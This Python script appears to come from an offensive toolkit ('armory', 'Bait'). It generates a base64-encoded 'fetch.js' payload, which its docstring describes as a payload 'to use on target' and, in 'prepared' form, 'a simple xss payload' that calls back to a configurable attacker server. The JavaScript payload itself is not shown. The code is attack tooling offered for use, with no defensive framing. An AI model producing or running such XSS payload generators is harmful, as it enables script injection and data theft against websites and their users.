import sys
from api.armory.parsers import Bait

ACCEPTED_ARGS = [
    '--protocol',
    '--server',
    '--format'
]

def get_payload():
    """
    Get payload to use on target

    Usage: python get_payload --protocol <http|https> --server <server_address> --format <b64|prepared>

    --protocol: Protocol used to access the server (http for regular use and https for when behind nginx), default is http
    --server: Server IP address, default is the default flask server address
    --format: Format in which you get the the payload, raw is raw text and prepared is a simple xss payload

    """
    if '-h' in sys.argv or '--help' in sys.argv:
        help(get_payload)
        exit()
    
    key = ''
    value = ''

    script_args = {}
    
    for i, arg in enumerate(sys.argv):
        if i == 0:
            continue
        
        if key:
            value = arg
            script_args[key] = value
            key = ''

        if arg in ACCEPTED_ARGS:
            key = arg

    return Bait.b64_encode('fetch.js', **script_args)

if __name__ == "__main__":
    print(get_payload())